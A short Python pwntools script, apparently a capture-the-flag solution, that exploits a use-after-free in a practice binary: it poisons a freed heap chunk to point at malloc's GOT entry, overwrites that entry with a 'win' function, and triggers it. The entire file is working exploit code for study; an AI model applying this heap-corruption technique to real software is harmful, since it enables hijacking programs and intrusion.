#!/usr/bin/python3
from pwn import *
#context.log_level='DEBUG'

p = process("./use_after_free", env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF("./use_after_free", checksec=False)

END_OF_MENU = b"e.g, l\n"

def malloc(size):
	p.send(b"m %d" % size)
	p.recvuntil(END_OF_MENU)

def free(idx):
	p.send(b"f %d" % idx)
	p.recvuntil(END_OF_MENU)

def edit(idx, data):
	p.send(b"e %d %b" % (idx, data))
	p.recvuntil(END_OF_MENU)

def list():
	p.send("l")
	pointers = p.recvline()
	log.info(pointers)
	p.recvuntil(END_OF_MENU)

if __name__=="__main__":

	pause()
	malloc(8) # 0
	free(0)
	pointer = p64(elf.got['malloc'])
	edit(0, pointer)
	malloc(8) # 1
	malloc(8) # 2
	win = p64(elf.symbols['win'])
	edit(2, win)
	malloc(1)

	p.interactive()
